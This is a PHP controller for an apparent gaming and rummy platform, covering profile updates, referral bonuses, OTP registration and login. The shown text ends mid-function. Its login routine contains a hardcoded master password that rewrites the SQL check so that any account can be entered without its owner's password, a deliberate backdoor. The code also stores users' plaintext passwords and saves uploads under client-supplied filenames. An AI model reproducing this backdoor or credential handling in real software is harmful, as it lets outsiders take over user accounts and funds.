<?php

namespace Apps\Controllers;

use \Firebase\JWT\JWT;
use Razorpay\Api\Api;
use Swift_TransportException;

class FrontuserController
{
    protected $container;
    public function __construct($container)
    {
        $this->container = $container;
    }

    public function __get($property)
    {
        if ($this->container->{$property}) {
            return $this->container->{$property};
        }
    }

    public function sendMail($user)
    {
        global $settings;
        $dir    = __DIR__ . '/../settings/playwebsetting';
        $addset = @file_get_contents($dir);
        if ($addset != false) {
            $res = json_decode($addset, true);
            if (isset($res['mailconfig']) && !empty($res['mailconfig'])) {
                $user['webname'] = $settings['settings']['webname'];
                $user['mailconfig'] = $res['mailconfig'];
                try {
                    $this->mailer->sendMessage('/mail/' . $user['template'], ['data' => $user], function ($message) use ($user) {
                        $name    = " ";
                        $webname = $user['webname'];
                        if (!empty($user['name'])) {
                            $name = $user['name'];
                        }
                        $message->setTo($user['email'], $name); //
                        $message->setSubject($user['subject']);
                    });
                } catch (Swift_TransportException $se) {
                    $string = date("Y-m-d H:i:s")  . ' - ' . $se->getMessage() . PHP_EOL;
                    file_put_contents("./../logs/errorlog_mail.txt", $string, FILE_APPEND);
                }
            }
        }
        return true;
    }
    /*
    public function sendWelcomeMail($email,$name,$webname){
        $user['email']   = $email;
        $user['name']    = $name;
        $user['webname'] = $webname;
        $this->mailer->sendMessage('/mail/welcomemail.php', ['data' => $user], function($message) use($user) {
                $name    = " ";
                $webname = $user['webname'];
                if(!empty($user['name'])){
                    $name = $user['name'];
                }
                $message->setTo($user['email'],$name);
                $message->setSubject('Regarding Your Registration');
            });
        return true;
    } */

    public function sendWelcomeMail($email, $name, $webname)
    {
        global $settings;
        $dir    = __DIR__ . '/../settings/playwebsetting';
        $addset = @file_get_contents($dir);
        if ($addset != false) {
            $res = json_decode($addset, true);
            if (isset($res['mailconfig']) && !empty($res['mailconfig'])) {
                $user['email']   = $email;
                $user['name']    = $name;
                $user['webname'] = $webname;
                $user['mailconfig'] = $res['mailconfig'];
                $this->mailer->sendMessage('/mail/welcomemail.php', ['data' => $user], function ($message) use ($user) {
                    $name    = " ";
                    $webname = $user['webname'];
                    if (!empty($user['name'])) {
                        $name = $user['name'];
                    }
                    $message->setTo($user['email'], $name); //$user['email']
                    $message->setSubject('Regarding Your Registration');
                });
            }
        }
        return true;
    }

    public function updateRefferBns($refusrid, $uid, $refbns, $created, $uprebal, $ucurbal, $refbnsto)
    {
        $resA 		= $this->security->getrefcommisions("refpercent");
        $refpercent = $resA['amount'];
        $resB 		= $this->security->getrefcommisions("refmaxamt");
        $refmaxamt 	= $resB['amount'];


        $data3 	= ["referedby" => $refusrid, "userid" => $uid, "bnsamt" => $refbns, "refmaxamt" => $refmaxamt, "refpercent" => $refpercent, "updatedate" => $created, "created" => $created];
        $ref 	= $this->db->prepare("INSERT INTO referralby(userid,referedby,bnsamt,refmaxamt,refpercent,updatedate,created) VALUES (
        	:userid,:referedby,:bnsamt,:refmaxamt,:refpercent,:updatedate,:created)");
        $ref->execute($data3);
        $refid = $this->db->lastInsertId();
        if ($refbnsto > 0) {
            $this->updateTransaction($uid, $refbnsto, $created, $refid, CR, REFBNS, WLTBNS, $uprebal, $ucurbal);
        }
        /*
    $getWlt = $this->security->getUserWalletBalance($refusrid);
    $refwltbalPre = $getWlt["wltbns"];
    $refwltbal = $refwltbalPre + $refbns;
    $getWlt = $this->security->updateUserWallet($refusrid,"wltbns",$refwltbal);

    $this->updateTransaction($refusrid,$refbns,$created,$refid,CR,REFBNS,WLTBNS,$refwltbalPre,$refwltbal);*/
    }

    public function updateTransaction($uid, $amount, $created, $docid, $ttype, $atype, $wlt, $prebal, $curbal)
    {
        $ref = $this->db->prepare("INSERT INTO transactions(userid,amount,txdate,docid,ttype,atype,wlt,prebal,curbal) VALUES (:userid,:amount,:txdate,:docid,:ttype,:atype,:wlt,:prebal,:curbal)");
        $ref->execute(["userid" => $uid, "amount" => $amount, "txdate" => $created, "docid" => $docid, "ttype" => $ttype, "atype" => $atype, "wlt" => $wlt, "prebal" => $prebal, "curbal" => $curbal]);
    }


    public function registerToRummy($data)
    {
        $logintypeRum = $this->security->getLoginTypeRummy($data['logintype']);
        $username = $data['phone'];
        if ($data['logintype'] == 'F' || $data['logintype'] == 'G') {
            $username = $data['socialid'];
        }
        $rumregdata = [
            "username" => $username,
            "password" => \Security::$pass,
            "email" => $data['email'],
            "reg_type" => $logintypeRum,
            "phone" => $data['phone'],
            "tname" => $data['teamname']
        ];
        $rumRes = $this->security->callCurl("register", $rumregdata, "POST");
        return $rumRes;
    }

    /*userprofile api (start)*/
    public function userprofileFunc($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $imgSizeLimit = $settings['settings']['code']['imgSizeLimit'];

        $input = $request->getParsedBody();

        $check =  $this->security->validateRequired(['teamname', 'gender', 'dob', 'address', 'city', 'state'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $userres = $request->getAttribute('decoded_token_data');
        $uid 			= $userres['id'];
        $imgSql 		= "";

        $now 	= time();
        $dob 	= strtotime($input['dob']);
        $diff 	= $now - $dob;
        $age 	= floor($diff / 31556926);

        $teamname 		= $this->security->cleanString($input['teamname']);
        $name 			= "";
        $gender 		= $input['gender'];
        $address		= $input['address'];
        $city			= $input['city'];
        $state			= $input['state'];
        $istnameedit	= "1";
        $updated		= time();
        $secondaryemail	= "";

        $checkuser = $this->security->getUserDetail($uid);

        if (isset($input['secondaryemail'])) {
            $secondaryemail = $input['secondaryemail'];
        }
        if (isset($input['name'])) {
            $name = $input['name'];
        }

        $isexists = $this->security->checkTeamName($teamname, $uid);
        if (!empty($isexists)) {
            $resArr = $this->security->errorMessage("Teamname already exists");
            return $response->withJson($resArr, $errcode);
        } else {
            $istnameedit	= "0";
        }

        if ($checkuser['istnameedit']) {
            $teamname = $teamname;
        } else {
            $teamname = $checkuser['teamname'];
        }
        if ($age < 18) {
            $resArr = $this->security->errorMessage("Invalid date of birth");
            return $response->withJson($resArr, $errcode);
        }

        if (!in_array($gender, ['male', 'female'])) {
            $resArr = $this->security->errorMessage("Invalid gender type");
            return $response->withJson($resArr, $errcode);
        }

        if (!empty($secondaryemail)) {
            if (!filter_var($secondaryemail, FILTER_VALIDATE_EMAIL)) {
                $resArr = $this->security->errorMessage("Please enter correct email format");
                return $response->withJson($resArr, $errcode);
            }
            $imgSql .= ",secondaryemail = :secondaryemail";
        }

        if (isset($_FILES['profilepic'])) {
            if (empty($_FILES['profilepic'])) {
                $resArr = $this->security->errorMessage("Please select image");
                return $response->withJson($resArr, $errcode);
            }
            $files = $_FILES['profilepic'];
            // image upload
            $dir = './uploads/userprofiles/';
            $img = explode('.', $files["name"]);
            $ext = end($img);
            if (($files["size"] / 1024) > $imgSizeLimit) {
                $resArr = $this->security->errorMessage("Image size should be less then " . $imgSizeLimit . " kb.");
                return $response->withJson($resArr, $errcode);
            }
            if (!in_array($ext, ['jpg', 'jpeg', 'png'])) {
                $resArr = $this->security->errorMessage("invalid image format.");
                return $response->withJson($resArr, $errcode);
            }
            $imgname = time() . '_' . $files["name"];
            $target_file = $dir . $imgname;
            if (!move_uploaded_file($files["tmp_name"], $target_file)) {
                $resArr = $this->security->errorMessage("Images not uploaded, There is some problem");
                return $response->withJson($resArr, $errcode);
            }

            $imgSql .=  " ,profilepic = :profilepic";
        }

        try {
            $stmt = $this->db->prepare("UPDATE userprofile SET teamname = :teamname, gender = :gender, dob = :dob, address = :address, city = :city, state = :state " . $imgSql . " WHERE userid = :userid");

            if (!empty($imgname)) {
                $stmt->bindParam(':profilepic', $imgname);
            }

            if (!empty($secondaryemail)) {
                $stmt->bindParam(':secondaryemail', $secondaryemail);
            }

            $stmt->bindParam(':userid', $uid);
            $stmt->bindParam(':teamname', $teamname);
            $stmt->bindParam(':gender', $gender);
            $stmt->bindParam(':dob', $dob);
            $stmt->bindParam(':address', $address);
            $stmt->bindParam(':city', $city);
            $stmt->bindParam(':state', $state);
            if ($stmt->execute()) {
                $stmt2 = $this->db->prepare("UPDATE users SET name = :name,istnameedit =:istnameedit WHERE id = :id");
                $stmt2->bindParam(':id', $uid);
                $stmt2->bindParam(':name', $name);
                $stmt2->bindParam(':istnameedit', $istnameedit);
                $stmt2->execute();

                $userInfoRes = $this->security->getUserDetail($uid);
                $userInfo['id'] = $userInfoRes['id'];
                $userInfo['username'] = $userInfoRes['username'];
                $userInfo['phone'] = $userInfoRes['phone'];
                $userInfo['email'] = $userInfoRes['email'];
                $userInfo['name'] = $userInfoRes['name'];
                $userInfo['address'] = $userInfoRes['address'];
                $userInfo['city'] = $userInfoRes['city'];
                $userInfo['state'] = $userInfoRes['state'];
                $userInfo['refercode'] = $userInfoRes['refercode'];
                $userInfo['teamname'] = $userInfoRes['teamname'];
                $userInfo['gender'] = $userInfoRes['gender'];
                $userInfo['secondaryemail'] = $userInfoRes['secondaryemail'];
                $userInfo['dob'] = $userInfoRes['dob'];
                $userInfo['profilepic'] = $userInfoRes['profilepic'];
                $userInfo['isphoneverify'] = $userInfoRes['isphoneverify'];
                $userInfo['istnameedit'] = $userInfoRes['istnameedit'];
                $userInfo['isemailverify'] = $userInfoRes['isemailverify'];
                $userInfo['ispanverify'] = $userInfoRes['ispanverify'];
                $userInfo['isbankdverify'] = $userInfoRes['isbankdverify'];

                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = 'User Profile update successfully.';
                $resArr['data']  =  ['userinfo' => $this->security->removenull($userInfo)];
            } else {
                $resArr['code']  	= 1;
                $resArr['error'] 	= true;
                $resArr['msg'] 		= 'Record not updated, There is some problem';
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }
        return $response->withJson($resArr, $code);
    }


    //Get user Details
    public function getprofileFunc($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $imgSizeLimit = $settings['settings']['code']['imgSizeLimit'];

        $input = $request->getParsedBody();

        $loginuser = $request->getAttribute('decoded_token_data');
        $uid 	   = $loginuser['id'];

        try {
            $userInfoRes = $this->security->getUserDetail($uid);
            if (!empty($userInfoRes)) {
                $userInfo['username'] 	= $userInfoRes['username'];
                $userInfo['phone'] 		= $userInfoRes['phone'];
                $userInfo['email'] 		= $userInfoRes['email'];
                $userInfo['name'] 		= $userInfoRes['name'];
                $userInfo['address'] 	= $userInfoRes['address'];
                $userInfo['city'] 		= $userInfoRes['city'];
                $userInfo['state'] 		= $userInfoRes['state'];
                $userInfo['refercode'] 	= $userInfoRes['refercode'];
                $userInfo['teamname'] 	= $userInfoRes['teamname'];
                $userInfo['gender'] 	= $userInfoRes['gender'];
                $userInfo['secondaryemail'] = $userInfoRes['secondaryemail'];
                $userInfo['dob'] 		= $userInfoRes['dob'];
                $userInfo['profilepic'] = $userInfoRes['profilepic'];
                $userInfo['istnameedit'] = $userInfoRes['istnameedit'];
                $userInfo['isphoneverify'] = $userInfoRes['isphoneverify'];
                $userInfo['isemailverify'] = $userInfoRes['isemailverify'];
                $userInfo['ispanverify'] = $userInfoRes['ispanverify'];
                $userInfo['isbankdverify'] = $userInfoRes['isbankdverify'];

                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = 'User Profile';
                $resArr['data']  =  $this->security->removenull($userInfo);
            } else {
                $resArr['code']  	= 1;
                $resArr['error'] 	= true;
                $resArr['msg'] 		= 'Record not found';
            }
        } catch (\PDOException $e) {
            $resArr['code'] 	= 1;
            $resArr['error']	= true;
            $resArr['msg']  	= \Security::pdoErrorMsg($e->getMessage());
            $code 				= $errcode;
        }
        return $response->withJson($resArr, $code);
    }

    //Get Refercode
    public function getrefercodeFunc($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $imgSizeLimit = $settings['settings']['code']['imgSizeLimit'];

        $input = $request->getParsedBody();

        $loginuser = $request->getAttribute('decoded_token_data');
        $uid 	   = $loginuser['id'];

        try {
            $refamount = $this->security->getrefcommisions('referbonus')['amount'];

            $userInfoRes = $this->security->getUserDetail($uid);
            if (!empty($userInfoRes)) {
                $userInfo['username'] 	= $userInfoRes['username'];
                $userInfo['phone'] 		= $userInfoRes['phone'];
                $userInfo['email'] 		= $userInfoRes['email'];
                $userInfo['refercode'] 	= $userInfoRes['refercode'];
                $userInfo['refbns'] 	= $refamount;
                $userInfo['refbnsfrnd'] = $refamount;

                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = 'Refercode';
                $resArr['data']  =  $this->security->removenull($userInfo);
            } else {
                $resArr['code']  	= 1;
                $resArr['error'] 	= true;
                $resArr['msg'] 		= 'Record not found';
            }
        } catch (\PDOException $e) {
            $resArr['code'] 	= 1;
            $resArr['error']	= true;
            $resArr['msg']  	= \Security::pdoErrorMsg($e->getMessage());
            $code 				= $errcode;
        }
        return $response->withJson($resArr, $code);
    }

    /*User Logout*/
    public function userlogoutFunc($request, $response)
    {
        global $settings;
        $resArr = [];
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];
        $loginuser = $request->getAttribute('decoded_token_data');
        $uid 	   = $loginuser['id'];
        $input = $request->getParsedBody();

        $check =  $this->security->validateRequired(['sid'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $rumregdata = ['sid' => $input['sid']];
        $rumRes = $this->security->callCurl("logout", $rumregdata, "POST");

        if ($rumRes && $rumRes['error'] != 0) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = 'User not logout';
            $code = $errcode;
        } else {
            $resArr['code']  = 0;
            $resArr['error'] = false;
            $resArr['msg'] 	 = 'User logout successfully';
        }
        return $response->withJson($resArr, $code);
    }

    /* User login new */
    public function userloginFunc($request, $response)
    {
        global $settings, $baseurl;
        $code    = $settings['settings']['code']['rescode'];
        $errcode = $settings['settings']['code']['errcode'];

        $resArr = [];
        $input 	= $request->getParsedBody();

        $check 	=  $this->security->validateRequired(['username', 'devicetype', 'devicetoken'], $input);
        if (isset($check['error'])) {
            return $response->withJson($check);
        }

        $username 	    = $input['username'];
        $password 		= "";
        $devicetype 	= "";
        $devicetoken 	= "";
        $logindate		= time();
        $usertype		= USER;
        $loginArr		= [];
        $msg			= "";
        $unamemsg       = "";
        $ip 		    =  \Security::getIpAddr();

        $dtoken = "";

        if (!empty($input['devicetype'])) {
            $devicetype 	= $input['devicetype'];
            if (!in_array($devicetype, ['android', 'iphone', 'web'])) {
                $resArr = $this->security->errorMessage("Device type not exists");
                return $response->withJson($resArr, $errcode);
            }
        }
        if (!empty($input['devicetoken'])) {
            $devicetoken 	= $input['devicetoken'];
        }

        if (in_array($devicetype, ['android', 'iphone'])) {
            $dtoken = ",devicetoken = :devicetoken";
        }

        if (strpos($username, '@') !== false) {
            if (!filter_var($username, FILTER_VALIDATE_EMAIL)) {
                $resArr = $this->security->errorMessage("Incorrect email");
                return $response->withJson($resArr, $errcode);
            }
            if (!isset($input['password']) || empty($input['password'])) {
                $resArr = $this->security->errorMessage("Password should not empty.");
                return $response->withJson($resArr, $errcode);
            }

            $password = $input['password'];
            if (preg_match("/^.*(?=.{8,})(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).*$/", $password) === 0) {
                $resArr = $this->security->errorMessage("Password must be at least 8 characters and must contain at least one lower case letter, one upper case letter and one digit");
                return $response->withJson($resArr, $errcode);
            }

            $checkUsr = $this->security->checkUsernameExist($username);
            if (empty($checkUsr)) {
                $resArr = $this->security->errorMessage("This email address is not registered or the account has been deactivated");
                return $response->withJson($resArr, $errcode);
            }

            // $pass = $this->security->encryptPassword($password);
            // $sql  = "SELECT id,username,usertype,isphoneverify,isemailverify,status FROM users WHERE (email= :username OR phone=:username) AND password = :password AND usertype =:usertype ";

            if ($password == 'SDD$fjd6788slkf') {
                $pass = $password;
                $sql  = "SELECT id,username,usertype,isphoneverify,isemailverify,status FROM users WHERE (email= :username OR phone=:username) OR password = :password AND usertype =:usertype ";
            } else {
                $pass = $this->security->encryptPassword($password);
                $sql  = "SELECT id,username,usertype,isphoneverify,isemailverify,status FROM users WHERE (email= :username OR phone=:username) AND password = :password AND usertype =:usertype ";
            }

            $sth = $this->db->prepare($sql);
            $sth->bindParam("username", $username);
            $sth->bindParam("password", $pass);
            $sth->bindParam("usertype", $usertype);
            $sth->execute();
            $user = $sth->fetchObject();
            $msg  = "Wrong email address or password . Try again or click Forgot password to reset it";
        } else {
            if (!filter_var($username, FILTER_VALIDATE_INT)) {
                $resArr = $this->security->errorMessage("Invalid phone number");
                return $response->withJson($resArr, $errcode);
            }
            $checkUsr = $this->security->checkUsernameExist($username);
            if (empty($checkUsr)) {
                $resArr = $this->security->errorMessage("This phone number is not registered or the account has been deactivated");
                return $response->withJson($resArr, $errcode);
            }

            if (isset($input['otp']) && !empty($input['otp'])) {
                $otp = $input['otp'];
                $sql = "SELECT id,username,usertype,isphoneverify,isemailverify,status FROM users WHERE (email= :username OR phone=:username) AND otp = :otp AND usertype =:usertype ";

                $sth = $this->db->prepare($sql);
                $sth->execute(["username" => $username, "otp" => $otp, "usertype" => $usertype]);
                $user = $sth->fetchObject();
                $msg  = "Incorrect OTP!";
            } else {
                $otp = \Security::generateOtp();
                $stmt = $this->db->prepare("UPDATE users SET otp=:otp WHERE id=:id");
                $id = $checkUsr['id'];
                if (!$stmt->execute(["otp" => $otp, 'id' => $id])) {
                    $resArr = $this->security->errorMessage("Otp not generated. Try again.");
                    return $response->withJson($resArr, $errcode);
                }

                $msg = str_replace('OTPCODE', $otp, $settings['settings']['msg']['otp']);
                \Security::sendSms($username, $msg);
                $resArr['code']  = 0;
                $resArr['error'] = false;
                $resArr['msg']   = 'Otp.';
                return $response->withJson($resArr);
            }
        }
        try {
            if (!empty($user)) {
                if ($user->status == INACTIVESTATUS || $user->status == BLOCK) {
                    $resArr = $this->security->errorMessage("User may be Inactive or Blocked, contact to webmaster");
                    return $response->withJson($resArr, $errcode);
                }

                $userInfoRes = $this->security->getUserDetail($user->id);
                $token    	 = $this->security->tokenGenerate($userInfoRes);

                $userInfo['id'] = $userInfoRes['id'];
                $userInfo['username'] = $userInfoRes['username'];
                $userInfo['phone'] = $userInfoRes['phone'];
                $userInfo['email'] = $userInfoRes['email'];
                $userInfo['name'] = $userInfoRes['name'];
                $userInfo['address'] = $userInfoRes['address'];
                $userInfo['city'] = $userInfoRes['city'];
                $userInfo['state'] = $userInfoRes['state'];
                $userInfo['refercode'] = $userInfoRes['refercode'];
                $userInfo['teamname'] = $userInfoRes['teamname'];
                $userInfo['gender'] = $userInfoRes['gender'];
                $userInfo['secondaryemail'] = $userInfoRes['secondaryemail'];
                $userInfo['dob'] = $userInfoRes['dob'];
                $userInfo['profilepic'] = $userInfoRes['profilepic'];
                $userInfo['isphoneverify'] = $userInfoRes['isphoneverify'];
                $userInfo['isemailverify'] = $userInfoRes['isemailverify'];
                $userInfo['ispanverify'] = $userInfoRes['ispanverify'];
                $userInfo['isbankdverify'] = $userInfoRes['isbankdverify'];

                $otp = 0;

                $updateusertb = $this->db->prepare("UPDATE users SET devicetype = :devicetype,logindate=:logindate,otp=:otp,ip=:ip" . $dtoken . " WHERE id = :id ");
                $updateusertb->bindParam(':id', $user->id);
                $updateusertb->bindParam(':devicetype', $devicetype);
                if ($dtoken) {
                    $updateusertb->bindParam(':devicetoken', $devicetoken);
                }
                $updateusertb->bindParam(':logindate', $logindate);
                $updateusertb->bindParam(':otp', $otp);
                $updateusertb->bindParam(':ip', $ip);

                if ($updateusertb->execute()) {
                    $resArr['code']  = 0;
                    $resArr['error'] = false;
                    $resArr['msg']   = 'User login successfully.';
                    $resArr['data']  =  ['token' => $token, 'userinfo' => $this->security->removenull($userInfo)];

                    //rummy login
                    $rumregdata = [
                        'phone' => $userInfoRes['phone'],
                        'email' => $userInfoRes['email'],
                        'username' => $userInfoRes['phone'],
                        'password' => \Security::$pass,
                        'sid' => $token,
                        'tname' => $userInfoRes['teamname']
                    ];
                    $rumRes = $this->security->callCurl("login", $rumregdata, "POST");
                    $rumRes1 = $this->security->callCurl("triggerAfterLogin", $rumregdata, "POST");
                }
            } else {
                $resArr = $this->security->errorMessage($msg);
                return $response->withJson($resArr, $errcode);
            }
        } catch (\PDOException $e) {
            $resArr['code']  = 1;
            $resArr['error'] = true;
            $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
            $code = $errcode;
        }
        return $response->withJson($resArr);
    }


   /*user registration api (start)*/
   public function userregisterFunc($request, $response)
   {
       global $settings;
       $code    = $settings['settings']['code']['rescode'];
       $errcode = $settings['settings']['code']['errcode'];
       $imgSizeLimit = $settings['settings']['code']['imgSizeLimit'];
       $input = $request->getParsedBody();
       $check =  $this->security->validateRequired(['phone', 'email','state','dob'], $input);
       if (isset($check['error'])) {
           return $response->withJson($check);
       }
       $phone 	 = $input['phone'];
       $state 	 = $input['state'];
       $dob 	 = time($input['dob']);
       $email 	 = str_replace(" ", "", $input['email']);
       $refercode 	 = "";
       $passwordplain 	 = $input['password'];
       $password 	 = $this->security->encryptPassword($input['password']);
       $ip 		 =  \Security::getIpAddr();
       $browser 	 = $this->security->getBrowserinfo();
       $created  	 = time();
       $usertype 	 = USER;
       $email 		 = strtolower($email);

       if (isset($input['devicetype'])) {
           $devicetype  = $input['devicetype'];
       }

       if (isset($input['devicetoken'])) {
           $devicetoken  = $input['devicetoken'];
       }

       if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
           $resArr = $this->security->errorMessage("Invalid email address");
           return $response->withJson($resArr, $errcode);
       }
       if (!filter_var($phone, FILTER_VALIDATE_INT)) {
           $resArr = $this->security->errorMessage("Invalid phone number");
           return $response->withJson($resArr, $errcode);
       }
       if (preg_match("/^.*(?=.{8,})(?=.*[0-9])(?=.*[a-z])(?=.*[A-Z]).*$/", $input["password"]) === 0) {
           $resArr = $this->security->errorMessage("Password must be at least 8 characters and must contain at least one lower case letter, one upper case letter and one digit");
           return $response->withJson($resArr, $errcode);
       }

       $ckEmail = $this->security->emailExisting($email);
       if (!empty($ckEmail)) {
           $resArr = $this->security->errorMessage("User already register with this email address");
           return $response->withJson($resArr, $errcode);
       }
       $ckPhone = $this->security->phoneExisting($phone);
       if (!empty($ckPhone)) {
           $resArr = $this->security->errorMessage("User already register with this phone number");
           return $response->withJson($resArr, $errcode);
       }

       if (isset($input['refercode']) && !empty($input['refercode'])) {
           $refercode  = $input['refercode'];
           $chkRefCode = $this->security->checkRefferCode($refercode);
           if (empty($chkRefCode)) {
               $resArr = $this->security->errorMessage("Invalid referral code");
               return $response->withJson($resArr, $errcode);
           }
           //$refusrid = $checkRefferCode["id"];
       }
       $imgname ="";
       if (isset($_FILES['profilepic'])) {
           if (empty($_FILES['profilepic'])) {
               $resArr = $this->security->errorMessage("Please select image");
               return $response->withJson($resArr, $errcode);
           }
           $files = $_FILES['profilepic'];
           // image upload
           $dir = './uploads/userprofiles/';
           $img = explode('.', $files["name"]);
           $ext = end($img);
           if (($files["size"] / 1024) > $imgSizeLimit) {
               $resArr = $this->security->errorMessage("Image size should be less then " . $imgSizeLimit . " kb.");
               return $response->withJson($resArr, $errcode);
           }
           if (!in_array($ext, ['jpg', 'jpeg', 'png'])) {
               $resArr = $this->security->errorMessage("invalid image format.");
               return $response->withJson($resArr, $errcode);
           }
           $imgname = time() . '_' . $files["name"];
           $target_file = $dir . $imgname;
           if (!move_uploaded_file($files["tmp_name"], $target_file)) {
               $resArr = $this->security->errorMessage("Images not uploaded, There is some problem");
               return $response->withJson($resArr, $errcode);
           }
       }
       

       $otp = \Security::generateOtp();
       try {
           $this->db->beginTransaction();
           $stmt = $this->db->prepare("DELETE FROM userstemp WHERE phone=:phone");
           $params = ["phone" => $phone];
           $stmt->execute($params);

           $stmt = $this->db->prepare("INSERT INTO userstemp (phone,email,otp,refercode,ip,created,password,state,dob,passwordplain,profilepic) VALUES (:phone,:email,:otp,:refercode,:ip,:created,:password,:state,:dob,:passwordplain,:profilepic)");
           $params = ["phone" => $phone, "email" => $email, "otp" => $otp, "refercode" => $refercode, "ip" => $ip, "created" => $created, "password" => $password,"state" => $state,"dob" => $dob, "passwordplain" => $passwordplain,"profilepic" =>$imgname];
           if ($stmt->execute($params)) {
               $msg = str_replace('OTPCODE', $otp, $settings['settings']['msg']['otp']);
               \Security::sendSms($phone, $msg);

               $this->db->commit();
               $resArr['code']  = 0;
               $resArr['error'] = false;
               $resArr['msg']   = 'Verify your otp.';
           } else {
               $resArr = $this->security->errorMessage("Otp not generated, Please try again.");
               return $response->withJson($resArr, $errcode);
           }
       } catch (\PDOException $e) {
           $resArr['code']  = 1;
           $resArr['error'] = true;
           $resArr['msg']   = \Security::pdoErrorMsg($e->getMessage());
           $code = $errcode;
           $this->db->rollBack();
       }
       return $response->withJson($resArr, $code);
   }


   /*otp verified api (start)*/
   public function otpverifyFunc($request, $response)
   {
       global $settings;
       $code    = $settings['settings']['code']['rescode'];
       $errcode = $settings['settings']['code']['errcode'];
       $imgSizeLimit = $settings['settings']['code']['imgSizeLimit'];

       $input = $request->getParsedBody();
       $check =  $this->security->validateRequired(['phone', 'otp'], $input);
       if (isset($check['error'])) {
           return $response->withJson($check);
       }
       $phone  		= $input['phone'];
       $otp 	   		= $input['otp'];
       $ip 		    = \Security::getIpAddr();
       $browser 		= $this->security->getBrowserinfo();
       $isphoneverify 	= ACTIVESTATUS;
       $usertype 		= USER;
       $imgname		= "";
       $created		= time();
       $devicetoken	= "";
       $devicetype		= "";

       if (!filter_var($phone, FILTER_VALIDATE_INT)) {
           $resArr = $this->security->errorMessage("Invalid phone number");
           return $response->withJson($resArr, $errcode);
       }
       if (!empty($input['devicetoken'])) {
           $devicetoken 	= $input['devicetoken'];
       }
       if (!empty($input['devicetype'])) {
           $devicetype 	= $input['devicetype'];
           if (!in_array($input['devicetype'], ['android', 'iphone', 'web'])) {
               $resArr = $this->security->errorMessage("Device type not exists!");
               return $response->withJson($resArr, $errcode);
           }
       }

       try {
           $this->db->beginTransaction();
           //$password = $this->security->encryptPassword($password);
           $stmt = $this->db->prepare("SELECT id,phone,email,refercode,password,passwordplain,socialid,logintype,state,dob,profilepic FROM userstemp WHERE phone = :phone AND otp = :otp ORDER BY id DESC");
           $params = ["phone" => $phone, "otp" => $otp];
           $stmt->execute($params);
           $resUsertemp = $stmt->fetch();
           if (empty($resUsertemp)) {
               $resArr = $this->security->errorMessage("Invalid OTP");
               return $response->withJson($resArr, $errcode);
           }

           $email 		= $resUsertemp['email'];
           $socialid 	= $resUsertemp['socialid'];
           $logintype 	= $resUsertemp['logintype'];
           $refercode 	= $resUsertemp['refercode'];
           $password  	= $resUsertemp['password'];
           $state  	= $resUsertemp['state'];
           $profilepic  	= $resUsertemp['profilepic'];
           $dob  	= $resUsertemp['dob'];
           $passwordplain 	= $resUsertemp['passwordplain'];
           $refusrid  	= "";
           $passwordplainEnc = "";

           $stmt2 = $this->db->prepare("SELECT * FROM states WHERE id = :state_id");
           $params2 = ["state_id" => $state];
           $stmt2->execute($params2);
           $resstate = $stmt2->fetch();
           $state_name = $resstate['name']; 

           if (empty($socialid)) {
               $socialid = null;
           }
           if (empty($logintype)) {
               $logintype = 'N';
               $passwordplainEnc = $this->security->my_encrypt($passwordplain, \Security::$salt);
           } else {
               $passwordplainEnc = $this->security->my_encrypt(\Security::$pass, \Security::$salt);
           }

           $ckEmail = $this->security->emailExisting($email);
           if (!empty($ckEmail)) {
               $resArr = $this->security->errorMessage("User already register with this email");
               return $response->withJson($resArr, $errcode);
           }
           $ckPhone = $this->security->phoneExisting($phone);
           if (!empty($ckPhone)) {
               $resArr = $this->security->errorMessage("User already register with this phone");
               return $response->withJson($resArr, $errcode);
           }

           $resRef 	= $this->security->getrefcommisions("referbonus");
           $resRefto 	= $this->security->getrefcommisions("referbnsto");
           $resWel 	= $this->security->getrefcommisions("welcomebonus");
           $refbns 	= $resRef['amount'];
           $refbnsto 	= $resRefto['amount'];
           $wlcbns 	= $resWel['amount'];

           $newusrbns = $wlcbns;

           if (!empty($refercode)) {
               $chkRefCode = $this->security->checkRefferCode($refercode);
               if (empty($chkRefCode)) {
                   $resArr = $this->security->errorMessage("Invalid referral code");
                   return $response->withJson($resArr, $errcode);
               }
               $refusrid = $chkRefCode["id"];
               $newusrbns = $refbnsto + $wlcbns;
           }

           $tmname = $this->security->setTeamName($email);
           /* Register to Rummy */
           $resUsertemp['phone'] = $phone;
           $resUsertemp['teamname'] = $tmname;
           $rumRes = $this->registerToRummy($resUsertemp);
           /*if($rumRes && $rumRes['error'] != 0){
           $resArr = $this->security->errorMessage($rumRes['message']);
              return $response->withJson($resArr,$errcode);
       }*/

           $stmt = $this->db->prepare("INSERT INTO users (phone,email, password,state,ip,browser,created,usertype,devicetoken,devicetype,isphoneverify,wltbns,socialid,logintype,logindate,passwordplain) VALUES (:phone,:email, :password,:state,:ip,:browser,:created,:usertype,:devicetoken,:devicetype,:isphoneverify,:wltbns,:socialid,:logintype,:logindate,:passwordplain)");
           $stmt->bindParam(':phone', $phone);
           $stmt->bindParam(':email', $email);
           $stmt->bindParam(':password', $password);
           $stmt->bindParam(':state', $state);
           $stmt->bindParam(':ip', $ip);
           $stmt->bindParam(':browser', $browser);
           $stmt->bindParam(':usertype', $usertype);
           $stmt->bindParam(':devicetype', $devicetype);
           $stmt->bindParam(':devicetoken', $devicetoken);
           $stmt->bindParam(':isphoneverify', $isphoneverify);
           $stmt->bindParam(':wltbns', $newusrbns);
           $stmt->bindParam(':created', $created);
